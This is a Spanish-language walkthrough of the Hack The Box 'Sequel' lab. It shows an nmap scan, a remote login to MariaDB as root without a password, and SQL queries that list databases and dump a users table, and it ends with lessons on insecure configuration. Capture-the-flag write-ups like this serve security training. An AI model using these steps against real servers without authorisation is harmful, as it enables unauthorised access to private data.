---
title: "Sequel: MariaDB con root sin contraseña"
description: "Máquina de Starting Point: reconocimiento de MariaDB, conexión remota y enumeración de bases de datos y tablas con SQL."
category: "laboratorios"
draft: false
---

**Plataforma:** Hack The Box (Starting Point) · **SO:** Linux (Debian 10) · **Dificultad:** Fácil

## Resumen

MariaDB está expuesta en el puerto 3306 y permite entrar como root sin contraseña. No hay ejecución remota de código: el problema es una configuración de autenticación insegura.

## 1. Enumeración de servicios

```bash
nmap -sC -Pn -sV <IP>
```

Se identifica MariaDB 10.3.27 en el puerto TCP/3306.

## 2. Conexión a la base de datos

```bash
mariadb -h <IP> -P 3306 -u root
```

- `-h`: host.
- `-P`: puerto.
- `-u`: usuario. Como no tiene contraseña, el cliente entra directamente.

## 3. Verificar el usuario

```sql
SELECT USER();
SELECT CURRENT_USER();
```

`USER()` muestra el usuario con el que te conectaste. `CURRENT_USER()` muestra el usuario que el servidor aplicó. Pueden ser distintos, y conviene saber cuál es cuál.

## 4. Listar bases de datos y tablas

```sql
SHOW DATABASES;
USE htb;
SHOW TABLES;
```

`USE` cambia la base de datos activa.

## 5. Revisar la estructura y los datos

```sql
DESCRIBE config;
DESCRIBE users;
SELECT * FROM users;
```

- `DESCRIBE` muestra las columnas de una tabla.
- `SELECT ... FROM ...;` consulta los datos.

## Aprendizaje

- Una base de datos no debe aceptar conexiones remotas de root sin contraseña.
- Los comandos básicos de SQL alcanzan para enumerar casi cualquier base mal configurada.
- La mayor parte del problema fue de configuración, no de código.
